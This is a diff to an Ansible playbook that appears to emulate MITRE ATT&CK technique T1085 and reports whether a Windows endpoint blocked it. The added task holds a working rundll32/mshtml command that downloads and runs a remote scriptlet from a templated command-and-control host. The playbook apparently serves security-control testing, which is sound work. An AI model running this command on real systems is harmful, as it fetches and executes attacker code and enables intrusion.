@@ -4,21 +4,21 @@
   vars_files:
    - /opt/ansible/vars.yaml
   tasks:
-    - name: Run Rundll32 to download and execute script (create a new file evil.sct)
-      tags: always
-      win_shell: |
-        'whoami > whoami.txt'
-        
-    - name: check file exist
-      tags: always
-      win_stat:
-        path: evil.sct
-      register: T1085
-    - name: check if playbook was blocked
-      tags: always
-      debug: msg="Playbook Completed#T1085:blocked#win#"
-      when: T1085.stat.exists == False        
-    - name: check if playbook was successfull
-      tags: always
-      debug: msg="Playbook Completed#T1085#passed#win#"
-      when: T1085.stat.exists  
+  - name: Run Rundll32 to download and execute script (create a new file evil.sct)
+    tags: always
+    win_shell: |
+      whoami > whoami.txt
+      rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://{{ cnc_fqdn }}:{{ cnc_port }}/{{ cnc_sct }}");window.close();
+  - name: check file exist
+    tags: always
+    win_stat:
+      path: evil.sct
+    register: T1085
+  - name: check if playbook was blocked
+    tags: always
+    debug: msg="Playbook Completed#T1085:blocked#win#"
+    when: T1085.stat.exists == False        
+  - name: check if playbook was successfull
+    tags: always
+    debug: msg="Playbook Completed#T1085#passed#win#"
+    when: T1085.stat.exists  
